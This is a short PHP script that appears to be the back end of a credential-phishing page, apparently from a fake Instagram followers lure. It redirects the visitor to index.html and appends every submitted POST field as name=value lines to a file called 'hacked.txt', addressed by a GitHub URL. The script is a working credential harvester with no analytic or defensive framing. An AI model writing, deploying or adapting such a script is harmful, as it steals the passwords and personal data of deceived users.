<?php
header ('Location: index.html');
$handle = fopen("https://github.com/Sultan2003/insta-followers/blob/6fc68f6cd0b609e2085262fce9d7af2beef0861e/hacked.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>
